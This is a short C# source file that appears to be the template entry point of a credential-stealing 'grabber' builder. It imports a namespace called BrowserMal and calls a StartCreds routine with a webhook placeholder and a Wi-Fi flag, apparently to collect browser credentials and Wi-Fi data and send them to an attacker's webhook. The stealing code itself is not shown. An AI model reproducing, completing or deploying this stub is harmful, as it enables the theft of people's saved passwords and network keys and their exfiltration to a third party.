using BrowserMal;

namespace GrabberTemplate
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string webhook = "%WEBHOOK%";
            Class1.StartCreds(webhook, %WIFI%);
        }
    }
}
